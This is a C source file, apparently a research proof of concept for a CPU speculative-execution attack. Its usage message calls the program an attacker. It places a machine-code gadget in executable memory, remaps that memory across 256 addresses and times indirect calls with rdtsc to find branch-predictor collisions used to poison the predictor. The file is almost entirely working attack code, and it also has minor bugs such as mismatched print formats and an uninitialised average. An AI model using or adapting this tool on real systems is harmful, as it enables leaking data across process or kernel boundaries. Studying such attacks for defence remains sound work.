#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <sys/mman.h>
#include <sys/mman.h>
#include <signal.h>
#include <linux/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>
#include <xmmintrin.h>

#define THRESHOLD 0xd0

void doNothing();

uint8_t *rdiPtr = (uint8_t *)doNothing;


#define GADGET_CLONE "\x90\x90\x90\x90\x90\x0f\x31\xff\x27\xb8\x1e\x00\x00\x00\x83\xe8\x01\x75\xfb\xeb\xeb"
#define GADGET_CLONE_SIZE 23

void doNothing(){
    asm volatile (
            "mov esi,eax            \n"
            "mov ebx,edx            \n"
    		"rdtsc                  \n"
            
            "shl rbx, 32             \n"
            "add rbx,rsi            \n"
            "shl rdx,32             \n"
            "add rdx,rax             \n"
            "sub rdx, rbx           \n"
            "mov rax, rdx           \n"
            );
}




uint32_t callGadget(uint64_t code){

    volatile uint32_t time;
    asm __volatile__(
                "lea rdi, %2    \n"
                "call %1       \n"
                :"=a" (time)
                : "m"(code),"m"(rdiPtr)
                : "rdi"
            );
    return time;
}

float disclosure(uint64_t rwx){


    uint64_t hits=0;
    uint32_t time;
    uint64_t totalTime=0;
    uint64_t total=0;

    //printf("Testing rwx=%p\n",rwx);


    hits=0;
    for(total=0; total<0x20;total++){
        time = callGadget(rwx);
        if(total>0x10){
            totalTime+=time;
        }
        
        
        if(time < THRESHOLD){
            hits++;
        }
    }
    float avg = (float)totalTime/(float)(total-0x10);
    

    return avg;
    

    
}
void poison(uint64_t srcAddr,uint64_t entryPoint){

    float best=0;
    float secondBest=0;
    float curr;
    float avg;
    uint8_t * bestrwx=NULL;
    uint8_t * secbestrwx=NULL;
    uint64_t p;
    uint8_t *rwx = mmap(NULL, 0x1000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS ,-1, 0);
    if(rwx==(uint8_t *)-1){
        perror("mmap rwx NULL failed");
        exit(1);
    }

    memcpy(&rwx[srcAddr],GADGET_CLONE,GADGET_CLONE_SIZE);

    for(uint64_t bhbMask=0; bhbMask<0x100UL;bhbMask++){

        p = (1UL<<32)+(bhbMask<<12);
        rwx = mremap(rwx,0x1000UL,0x1000UL,MREMAP_MAYMOVE|MREMAP_FIXED,p);
        if(rwx==(uint8_t *)-1){
            perror("mmap rwx failed");
            exit(1);
        }

        curr = disclosure(rwx+entryPoint);
        avg+=curr;
        //printf("rwx=%p exec time  %f\n",rwx,curr);
        if(curr < 70){ //outlier
            if(curr > best ){
                secondBest = best;
                best=curr;
                secbestrwx = bestrwx;
                bestrwx = rwx;
            }
            else if(curr > secondBest){
                secondBest = curr;
                secbestrwx = rwx;
            }
        }

        
    }
    printf("best match at %f (%p)\n",bestrwx,best);
    printf("Second best match at %f (%p) - avg: %f\n",secbestrwx,secondBest,avg/0x100);
   
}

int main(int argc,char **argv){
    
    struct timeval begint, endt;

    if (argc < 3){
        printf("Usage: ./attacker gadgetBase, entrypoint\n");
        printf("Example: ./attacker 0x154 0x15d \n");
        return 0;
    }
    uint64_t srcAddr=(uint64_t)strtoul(argv[1],NULL,16)&0xfff;
    uint64_t entrypoint=(uint64_t)strtoul(argv[2],NULL,16)&0xfff;

    printf("attacker: src: %p ->dst ? \n",srcAddr);
    
    gettimeofday(&begint, 0);
    poison(srcAddr,entrypoint);
    gettimeofday(&endt, 0);
    long seconds = endt.tv_sec - begint.tv_sec;
    long microseconds = endt.tv_usec - begint.tv_usec;
    double elapsed = seconds + microseconds*1e-6;
    printf("Finished at: %.3f seconds.\n", elapsed);
}